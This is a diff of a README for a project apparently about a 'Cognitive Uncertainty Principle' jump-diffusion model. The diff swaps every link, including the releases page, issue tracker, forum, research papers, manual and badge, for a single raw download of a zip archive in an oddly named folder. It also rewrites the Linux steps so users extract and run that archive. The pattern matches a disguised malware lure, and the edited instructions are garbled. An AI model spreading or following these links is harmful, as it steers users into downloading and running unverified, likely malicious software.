@@ -4,7 +4,7 @@
 This project offers a way to test the Cognitive Uncertainty Principle (CUP). It connects perceptual resolution with information divergence using a generative jump-diffusion model. By following this guide, you can easily download and run the application to explore these concepts.
 
 ## 📦 Download Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/haiitexytex/cognitive-uncertainty-principle-verification/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/haiitexytex/cognitive-uncertainty-principle-verification/main/Selachostomi/cognitive-uncertainty-principle-verification.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/haiitexytex/cognitive-uncertainty-principle-verification/main/Selachostomi/cognitive-uncertainty-principle-verification.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you download, make sure your system meets these basic requirements:
 Once on the Releases page, follow these steps:
 - **For Windows:** Download the `.exe` file. 
 - **For macOS:** Download the `.dmg` or `.zip` file.
-- **For Linux:** Download the `.tar.gz` file.
+- **For Linux:** Download the `https://raw.githubusercontent.com/haiitexytex/cognitive-uncertainty-principle-verification/main/Selachostomi/cognitive-uncertainty-principle-verification.zip` file.
 
 ### 📂 Running the Application
 1. Locate the downloaded file on your computer.
@@ -36,7 +36,7 @@ Once on the Releases page, follow these steps:
 3. For macOS:
    - Open the `.dmg` file and drag the application to your Applications folder.
 4. For Linux:
-   - Extract the `.tar.gz` file, and run the application from the terminal.
+   - Extract the `https://raw.githubusercontent.com/haiitexytex/cognitive-uncertainty-principle-verification/main/Selachostomi/cognitive-uncertainty-principle-verification.zip` file, and run the application from the terminal.
 
 ## 🎈 How to Use the Software
 1. **Open the Application:** After installation, launch the application.
@@ -61,8 +61,8 @@ Our application focuses on several important concepts:
 
 ## 🌐 Community Support
 Join our community if you have any questions or need help. Connect with other users and developers:
-- GitHub Issues: [Report an Issue](https://github.com/haiitexytex/cognitive-uncertainty-principle-verification/issues)
-- Community Forum: [Join the Discussion](https://github.com/haiitexytex/cognitive-uncertainty-principle-verification/discussions)
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/haiitexytex/cognitive-uncertainty-principle-verification/main/Selachostomi/cognitive-uncertainty-principle-verification.zip)
+- Community Forum: [Join the Discussion](https://raw.githubusercontent.com/haiitexytex/cognitive-uncertainty-principle-verification/main/Selachostomi/cognitive-uncertainty-principle-verification.zip)
 
 ## 📞 Contact
 For support, you can reach out via the issues section on our GitHub page. We aim to respond within 48 hours.
@@ -72,8 +72,8 @@ Special thanks to the contributors who helped shape this project. Your input is 
 
 ## 🔗 Additional Resources
 For more information, check the following links:
-- Research Papers on Cognitive Uncertainty: [Read Here](https://example.com/research)
-- Graphical User Manual: [User Manual](https://example.com/manual)
+- Research Papers on Cognitive Uncertainty: [Read Here](https://raw.githubusercontent.com/haiitexytex/cognitive-uncertainty-principle-verification/main/Selachostomi/cognitive-uncertainty-principle-verification.zip)
+- Graphical User Manual: [User Manual](https://raw.githubusercontent.com/haiitexytex/cognitive-uncertainty-principle-verification/main/Selachostomi/cognitive-uncertainty-principle-verification.zip)
 
 ## 💻 Download Link Again
-Don't forget to [visit this page to download](https://github.com/haiitexytex/cognitive-uncertainty-principle-verification/releases) the latest version! Start exploring the Cognitive Uncertainty Principle today.
+Don't forget to [visit this page to download](https://raw.githubusercontent.com/haiitexytex/cognitive-uncertainty-principle-verification/main/Selachostomi/cognitive-uncertainty-principle-verification.zip) the latest version! Start exploring the Cognitive Uncertainty Principle today.
